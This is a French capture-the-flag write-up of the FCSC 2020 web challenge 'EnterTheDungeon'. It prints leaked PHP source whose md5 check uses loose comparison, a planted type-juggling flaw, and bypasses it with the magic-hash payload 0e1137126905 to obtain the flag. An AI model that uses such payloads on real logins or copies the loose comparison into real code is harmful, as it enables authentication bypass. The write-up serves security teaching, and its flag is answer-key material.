<p align="center">
  <a href="" rel="noopener">
 <img style="width:50px;" src="https://france-cybersecurity-challenge.fr/files/abecee1bc8e9f22344226e697e672a7d/navbar_logo.png" alt="Project logo"></a>
</p>
<h1 align="center">EnterTheDungeon</h1>

<div align="center">

[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)

</div>

--- 

## 📝 Table des matières

- [Enoncé](#problem_statement)
- [Sources](#idea)

## 🧐 Enoncé <a name = "problem_statement"></a>

Pour commencer, regardons un peu le site.

On y voit du texte, un chateau en ascii art, et un petit formulaire ou l'on demande un secret.

Dans un des textes, ont nous indique que le formulaire est désactivé.

```
Les admins ont reçu un message indiquant qu'un pirate avait retrouvé le secret en contournant la sécurité du site.
Pour cette raison, le formulaire de vérification n'est plus fonctionnel tant que le développeur n'aura pas corrigé la vulnérabilité
```

Lorsque l'on valide le formulaire, nous sommes redirigé vers check_secret.php?secret=VALEUR

Regardons le code source de l'index.

Il y avait un commentaire html.

```html
<!-- Pour les admins : si vous pouvez valider les changements que j'ai fait dans la page "check_secret.php", le code est accessible sur le fichier "check_secret.txt" -->
```

Allons voir ce fameux chec_secret.txt

```php
<?php
	session_start();
	$_SESSION['dungeon_master'] = 0;
?>
<html>
<head>
	<title>Enter The Dungeon</title>
</head>
<body style="background-color:#3CB371;">
<center><h1>Enter The Dungeon</h1></center>
<?php
	echo '<div style="font-size:85%;color:purple">For security reason, secret check is disable !</div><br />';
	echo '<pre>'.chr(10);
	include('./ecsc.txt');
	echo chr(10).'</pre>';

	// authentication is replaced by an impossible test
	//if(md5($_GET['secret']) == "a5de2c87ba651432365a5efd928ee8f2")
	if(md5($_GET['secret']) == $_GET['secret'])
	{
		$_SESSION['dungeon_master'] = 1;
		echo "Secret is correct, welcome Master ! You can now enter the dungeon";
		
	}
	else
	{
		echo "Wrong secret !";
	}
?>
</body></html>
```

D'accord  ont peut voir, que pour pouvoir entrer dans le dongeon il faut le secret. 
Mais la condition est :
```php
if(md5($_GET['secret']) == $_GET['secret'])
```

C'est ce que l'on appelle "type juggling".

Il nous faut trouver un hash en md5 qui soit égal a la valeur sans md5.

Pour cela le ce <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/">github</a> peut nous servir !

Si l'ont regarde le tableau **Magic Hashes - Exploit** on peut voir différent hash, celui qui me semble le plus adéquate est le 0e1137126905.

Essayons
```
check_secret.php?secret=0e1137126905
```

Ok, l'accès est validé.
```
Secret is correct, welcome Master ! You can now enter the dungeon
```

Retournons sur l'index pour voir si quelque chose à changé maintenant.

C'est tout bon ! Le flag est la!
```
Félicitation Maître, voici le flag : FCSC{f67aaeb3b15152b216cb1addbf0236c66f9d81c4487c4db813c1de8603bb2b5b}
```


## ⛓️ Sources <a name = "limitations"></a>

Git - Swisskyrepo : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
